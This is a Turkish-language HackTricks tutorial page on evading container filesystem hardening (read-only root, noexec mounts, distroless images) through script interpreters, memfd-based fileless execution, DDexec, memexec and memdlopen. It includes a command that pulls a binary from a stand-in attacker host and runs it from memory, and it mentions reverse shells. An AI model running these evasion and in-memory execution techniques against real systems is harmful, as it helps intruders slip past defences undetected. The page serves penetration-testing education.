# FS korumalarını aşma: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## Videolar

Aşağıdaki videolarda bu sayfada bahsedilen tekniklerin daha ayrıntılı açıklamalarını bulabilirsiniz:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4).<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU).<sup>[[2]](#references)</sup>

## Salt okunur / no-exec senaryosu

Bir container'da, güvenlik bağlamında **`readOnlyRootFilesystem: true`** ayarını yaparak root filesystem'ı salt okunur olarak bağlayabilirsiniz.<sup>[[3]](#references)</sup> Örneğin:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
  name: alpine-pod
spec:
  containers:
  - name: alpine
    image: alpine
    securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Salt okunur bir root filesystem, ayrı olarak bağlanan volume'ları salt okunur yapmaz. Docker, **`/dev/shm`**'yi bir IPC mount olarak ele alır; `rw` ve `noexec` gibi tmpfs seçenekleri ise runtime yapılandırma tercihleridir. Bu davranışlardan herhangi birine güvenmeden önce hedef container'ın mount seçeneklerini inceleyin.<sup>[[4]](#references)[[5]](#references)</sup>

> [!WARNING]
> Red-team perspektifinden bakıldığında, bu kombinasyon önceden mevcut olmayan binary'leri (örneğin, backdoor'lar veya enumeration araçları) indirmeyi ve çalıştırmayı zorlaştırabilir.<sup>[[4]](#references)[[5]](#references)</sup>

## En kolay bypass: Script'ler

`noexec` mount, o mount üzerindeki binary'lerin doğrudan çalıştırılmasını engeller; ancak bir interpreter yine de bir script'i okuyup yorumlayabilir. Bu nedenle `sh` veya `python` mevcutsa, bu interpreter üzerinden bir shell veya Python script'i çalıştırabilirsiniz.<sup>[[5]](#references)</sup>

Gerekli aracın kendisi bir binary ise bu işe yaramaz.<sup>[[5]](#references)</sup>

## Bellek bypass'ları

Bağlı bir path üzerinden doğrudan çalıştırma engellendiğinde, seçeneklerden biri ELF'yi belleğe yükleyip bellek içi bir path üzerinden çalıştırmaktır. Bu yöntem, o mount üzerindeki `noexec` denetimini aşar; ancak kernel, izin veya policy kontrollerini ortadan kaldırmaz.<sup>[[5]](#references)[[6]](#references)</sup>

### FD + exec syscall bypass

Bir scripting runtime ilgili Linux arayüzüne erişebiliyorsa, **`memfd_create(2)`** ile anonim, RAM destekli bir file descriptor oluşturabilir, ELF baytlarını bu descriptor'a yazabilir ve fd destekli bir çalıştırma yolu kullanabilir. [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) projesi bu iş akışı için sıkıştırılmış ve base64 ile kodlanmış Python, Perl veya Ruby kodu oluşturur.<sup>[[6]](#references)[[7]](#references)</sup>

Proje şu anda Python, Perl ve Ruby hedeflerini belgeliyor. PHP veya Node farklı, runtime'a özgü bir teknik ya da eklenti gerektirir; dolayısıyla belirli bir dil için bu generator'ın bulunmaması, bellek içi çalıştırmanın imkânsız olduğu anlamına gelmez.<sup>[[6]](#references)[[12]](#references)</sup>

Anonim dosya çalıştırma, ilgili staging kalıpları, tespit ve adli veri toplama konularının daha kapsamlı ele alındığı [Linux Fileless Execution](../../../post-exploitation/linux-fileless-execution.md) sayfasına bakın.

> [!WARNING]
> **`/dev/shm`**'ye yazılmış normal bir executable, ilgili mount'un **`noexec`** ayarına tabi olmaya devam eder; dosyayı sıradan bir file descriptor üzerinden açmak mount policy'sini değiştirmez.<sup>[[5]](#references)</sup>
>
> Bellek içi çalıştırmanın kesin yöntemi runtime'a, mimariye, kernel'e ve mevcut izinlere de bağlıdır.<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec), **`/proc/self/mem`** üzerinden çalışan shell sürecine bir stager ve loader yazar, ardından denetimi bu koda aktarır.<sup>[[8]](#references)</sup>

Bu sayede süreç, sağlanan bir binary'yi öncelikle executable bir filesystem'a yerleştirmeden yükleyebilir.<sup>[[8]](#references)</sup>

> [!TIP]
> **DDexec / EverythingExec**, **bellekten** shellcode veya bir binary yükleyip **çalıştırabilir**.<sup>[[8]](#references)</sup>

```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```

Daha fazla bilgi için bu tekniğe GitHub'dan bakın veya:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec), daemon olarak çalışan bir DDexec uygulamasıdır. Daemon, argümanlar ve ham program baytları içeren istekleri dinler, her programı yükleyip çalıştırmak için bir child process oluşturur ve parent process'i sunucu olarak çalışır durumda tutar.<sup>[[9]](#references)</sup>

Depoda, **memexec kullanarak PHP reverse shell üzerinden binary'leri çalıştırma** örneği [a.php](https://github.com/arget13/memexec/blob/main/a.php) dosyasında bulunur.<sup>[[9]](#references)</sup>

### Memdlopen

DDexec'e benzer bir amaca sahip olan [**memdlopen**](https://github.com/arget13/memdlopen), bir shared object veya program için fileless `dlopen()` uygulamasıdır. README şu anda ARM64 desteğini belgeliyor; bu nedenle kullanmadan önce hedef mimariyi kontrol edin.<sup>[[10]](#references)</sup>

## Distroless Bypass

**Distroless'in gerçekte ne olduğu**, ne zaman faydalı olduğu, ne zaman olmadığı ve container'larda post-exploitation taktiklerini nasıl değiştirdiği hakkında ayrıntılı açıklama için şuraya bakın:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Distroless nedir

Distroless image'lar yalnızca uygulamayı ve onun runtime bağımlılıklarını içerir; resmi image'lar, standart bir Linux dağıtımında bulunması beklenen package manager'ları, shell'leri ve diğer programları içermez.<sup>[[11]](#references)</sup>

Runtime image'ını bu bağımlılıklarla sınırlamak, production ortamında bulunan yazılım miktarını ve taranıp takip edilmesi gereken bileşen sayısını azaltır.<sup>[[11]](#references)</sup>

### Reverse Shell

Distroless bir container'da normal bir shell için `sh` veya `bash` bulamayabilir, ayrıca `ls`, `whoami` veya `id` gibi yaygın yardımcı programlar da bulunmayabilir.<sup>[[11]](#references)</sup>

> [!WARNING]
> Bu nedenle, shell tabanlı olağan bir reverse shell veya yardımcı programlarla yapılan enumeration çalışmayabilir.<sup>[[11]](#references)</sup>

Ele geçirilmiş uygulamada bir dil runtime'ı varsa (örneğin, Flask uygulaması için Python veya Node uygulaması için Node.js), bir RCE yine de bu runtime'ı API'leri üzerinden komut kanalı ve sistem incelemesi için kullanabilir.<sup>[[11]](#references)[[12]](#references)</sup>

> [!TIP]
> Dilin özelliklerini kullanarak **sistemi enumerate etmek** için mevcut scripting language'den yararlanın.<sup>[[12]](#references)</sup>

**read-only/no-exec** korumaları yoksa, bir komut kanalı binary'leri yazılabilir ve çalıştırılabilir bir mount'a yazıp çalıştırabilir; önce mount seçeneklerini ve izinleri doğrulayın.<sup>[[4]](#references)[[5]](#references)</sup>

> [!TIP]
> Bu korumalar mevcutsa, runtime, kernel ve izinlerin elverdiği durumlarda yukarıdaki **memory-execution tekniklerini** kullanın.<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>

RCE zafiyetlerini istismar ederek scripting language **reverse shell**'leri elde etme ve binary'leri bellekten çalıştırma **örneklerini** [**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) içinde bulabilirsiniz.<sup>[[12]](#references)</sup>

## References

- [1] [DEF CON 31 - Gizlilik ve Kaçınma için Linux Bellek Manipülasyonunu İnceleme](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [DDexec-ng ve bellek içi dlopen() ile gizli sızmalar - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
- [3] [Pod veya Container için Güvenlik Bağlamı Yapılandırma](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [4] [docker container run](https://docs.docker.com/reference/cli/docker/container/run)
- [5] [mount(8) - Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/mount.8.html)
- [6] [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec)
- [7] [memfd_create(2) - Linux kılavuz sayfası](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
- [8] [DDexec](https://github.com/arget13/DDexec)
- [9] [memexec](https://github.com/arget13/memexec)
- [10] [memdlopen](https://github.com/arget13/memdlopen)
- [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
- [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
{{#include ../../../../banners/hacktricks-training.md}}
